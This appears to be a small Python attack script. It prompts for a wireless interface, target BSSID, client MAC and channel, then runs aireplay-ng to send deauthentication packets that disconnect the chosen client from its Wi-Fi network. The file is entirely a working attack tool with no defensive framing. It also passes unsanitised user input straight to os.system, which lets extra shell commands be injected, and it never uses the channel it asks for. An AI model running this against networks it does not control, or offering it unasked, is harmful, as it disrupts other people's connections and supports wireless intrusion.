#!/usr/bin/python3.7


from __future__ import unicode_literals
from prompt_toolkit import prompt
import os
from termcolor import colored
from time import sleep

print('Enter the Interface >> ')
interface = prompt()
print("Enter the Target MAC Address [BSSID] >> ")
bssid = prompt()
print("Enter the MAC address of the connected network [station] >> ")
station =prompt()
print("Enter the channel number that the wireless network is currently running on [ch] >> ") 
channel =prompt()

aireplay1 = 'aireplay-ng --deauth 10 -a {0} -c {1} {2}'.format(
    bssid, station, interface + 'mon')
os.system(aireplay1)
sleep(5)
